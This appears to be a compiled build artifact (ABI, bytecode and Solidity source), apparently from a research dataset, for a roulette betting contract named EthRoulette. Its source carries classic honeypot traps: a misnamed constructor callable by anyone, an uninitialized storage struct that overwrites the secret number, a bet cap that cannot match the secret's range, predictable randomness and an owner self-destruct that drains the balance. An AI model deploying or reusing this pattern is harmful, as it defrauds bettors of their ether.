{
  "contractName": "EthRoulette",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "gamesPlayed",
      "outputs": [
        {
          "name": "player",
          "type": "address"
        },
        {
          "name": "number",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "ownerAddr",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "lastPlayed",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "betPrice",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "CryptoRoulette",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "number",
          "type": "uint256"
        }
      ],
      "name": "play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405267016345785d8a000060025534801561001c57600080fd5b506105488061002c6000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063382cf0a61461008557806341c0e1b5146100f9578063688a7044146101105780636898f82b146101275780639c675eaa14610147578063c53391321461019e578063cfd8a175146101c9575b005b34801561009157600080fd5b506100b0600480360381019080803590602001909291905050506101f4565b604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390f35b34801561010557600080fd5b5061010e610247565b005b34801561011c57600080fd5b506101256102ca565b005b61014560048036038101908080359060200190929190505050610315565b005b34801561015357600080fd5b5061015c61049f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101aa57600080fd5b506101b36104c5565b6040518082815260200191505060405180910390f35b3480156101d557600080fd5b506101de6104cb565b6040518082815260200191505060405180910390f35b60048181548110151561020357fe5b90600052602060002090600202016000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060010154905082565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480156102aa5750620151806001540142115b156102c8573373ffffffffffffffffffffffffffffffffffffffff16ff5b565b33600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506103136104d1565b565b6000600254341015801561032a5750600a8211155b151561033557600080fd5b338160000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550818160010181905550600481908060018154018082558091505090600182039060005260206000209060020201600090919290919091506000820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001820154816001015550505060005482141561048c573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561048a573d6000803e3d6000fd5b505b6104946104d1565b426001819055505050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b60025481565b600160144260014303406040518083815260200182600019166000191681526020019250505060405180910390206001900460ff1681151561050f57fe5b060160ff166000819055505600a165627a7a72305820b18ba808864422755846bd2e68c984ad97c1de38f572917dcdc89b507a47b1bf0029",
  "source": "\n\n\n\n\n\n\ncontract EthRoulette {\n\n    uint256 private secretNumber;\n    uint256 public lastPlayed;\n    uint256 public betPrice = 0.1 ether;\n    address public ownerAddr;\n\n    struct Game {\n        address player;\n        uint256 number;\n    }\n    Game[] public gamesPlayed;\n\n    function CryptoRoulette() public {\n        ownerAddr = msg.sender;\n        shuffle();\n    }\n\n    function shuffle() internal {\n        \n        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;\n    }\n\n    function play(uint256 number) payable public {\n        require(msg.value >= betPrice && number <= 10);\n\n        Game game;\n        game.player = msg.sender;\n        game.number = number;\n        gamesPlayed.push(game);\n\n        if (number == secretNumber) {\n            \n            msg.sender.transfer(this.balance);\n        }\n\n        shuffle();\n        lastPlayed = now;\n    }\n\n    function kill() public {\n        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {\n            suicide(msg.sender);\n        }\n    }\n\n    function() public payable { }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x36f726e01cc85fdb0d998dfc442856379c569274/contracts/0x36f726e01cc85fdb0d998dfc442856379c569274.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:52:10.487Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}